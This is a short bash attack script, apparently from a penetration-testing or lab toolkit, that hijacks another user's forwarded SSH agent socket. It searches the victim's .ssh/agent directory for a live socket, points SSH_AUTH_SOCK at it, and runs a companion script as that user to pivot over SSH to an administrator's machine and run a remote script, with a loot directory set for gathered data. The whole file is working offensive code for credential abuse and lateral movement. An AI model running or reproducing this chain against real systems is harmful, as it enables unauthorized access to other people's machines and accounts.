#!/usr/bin/env bash
# Full chain: hijack agent from legacy session → SSH admin PC → run remote script.
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ADMIN_IP="${1:-}"
export LOOT_DIR="${LOOT_DIR:-/tmp}"

[[ -n "$ADMIN_IP" ]] || { echo "Usage: $0 <ADMIN_IP>"; exit 1; }

VICTIM_USER="${VICTIM_USER:-legacy}"
AUTH_SOCK=""
shopt -s nullglob
for s in /home/"${VICTIM_USER}"/.ssh/agent/*; do
  [[ -S "$s" ]] && AUTH_SOCK="$s" && break
done
shopt -u nullglob
[[ -n "$AUTH_SOCK" ]] || { echo "[-] No agent socket for ${VICTIM_USER}"; exit 1; }

export SSH_AUTH_SOCK="$AUTH_SOCK"
runuser -u "$VICTIM_USER" -- "$DIR/post_pivot_admin_host.sh" "$ADMIN_IP" "${2:-22}"